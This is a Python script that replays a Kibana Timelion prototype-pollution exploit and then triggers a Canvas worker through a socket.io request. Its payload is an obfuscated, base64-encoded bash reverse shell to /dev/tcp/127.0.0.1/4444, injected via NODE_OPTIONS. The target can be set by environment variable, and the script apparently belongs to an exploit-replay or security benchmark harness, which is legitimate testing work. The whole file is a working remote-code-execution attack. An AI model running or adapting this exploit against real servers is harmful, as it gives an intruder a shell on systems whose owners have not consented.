"""Replay the Timelion prototype pollution and Canvas worker trigger."""

import base64
import json
import os
import time
import urllib.request


def target_url() -> str:
    return (
        os.environ.get("LOCAL_TARGET_URL")
        or os.environ.get("REMOTE_TARGET_URL")
        or "http://127.0.0.1:15602"
    ).rstrip("/")


def timelion_expression() -> str:
    command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"'
    encoded = base64.b64encode(command.encode()).decode()
    javascript = (
        'require("child_process").exec('
        f'Buffer.from("{encoded}","base64").toString());process.exit()//'
    )
    return (
        f".es(*).props(label.__proto__.env.AAAA='{javascript}')"
        ".props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"
    )


def pollute_environment(base_url: str) -> None:
    body = {
        "sheet": [timelion_expression()],
        "time": {
            "from": "now-1h",
            "to": "now",
            "interval": "auto",
            "timezone": "UTC",
        },
    }
    request = urllib.request.Request(
        f"{base_url}/api/timelion/run",
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json", "kbn-xsrf": "true"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=30) as response:
        result = json.load(response)
    if not result.get("sheet") or result["sheet"][0].get("exception"):
        raise RuntimeError(f"Timelion rejected expression: {result!r}")


def trigger_canvas_worker(base_url: str) -> None:
    request = urllib.request.Request(
        f"{base_url}/socket.io/?EIO=3&transport=polling&t={int(time.time() * 1000)}",
        headers={"kbn-xsrf": "true"},
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        handshake = response.read().decode()
    if '"sid"' not in handshake:
        raise RuntimeError(f"Canvas socket handshake failed: {handshake!r}")


def main() -> None:
    base_url = target_url()
    pollute_environment(base_url)
    trigger_canvas_worker(base_url)
    time.sleep(5)
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
